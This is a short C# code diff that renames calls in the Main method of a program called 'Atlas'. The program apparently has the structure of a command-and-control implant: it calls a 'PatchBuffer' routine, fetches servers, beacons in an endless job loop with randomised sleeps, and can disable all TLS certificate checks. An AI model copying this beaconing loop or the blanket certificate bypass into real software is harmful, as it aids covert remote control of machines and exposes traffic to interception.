@@ -9,7 +9,7 @@ namespace Atlas
     {
         public static void Main(string[] args)
         {
-            Modules.PatchBuffer();
+            PatchBuffer.StartPatchBuffer();
             Utils.GetServers();
 #if CERT_FALSE
             System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
@@ -19,14 +19,14 @@ namespace Atlas
                 int Dwell = Utils.GetDwellTime();
                 System.Threading.Thread.Sleep(Dwell);
             }
-            Utils.JobList JobList = new Utils.JobList
+            Messages.JobList JobList = new Messages.JobList
             {
                 job_count = 0,
                 jobs = { }
             };
             while (true)
             {
-                Utils.Loop(JobList);
+                Dispatch.Loop(JobList);
                 int Dwell = Utils.GetDwellTime();
                 System.Threading.Thread.Sleep(Dwell);
             }
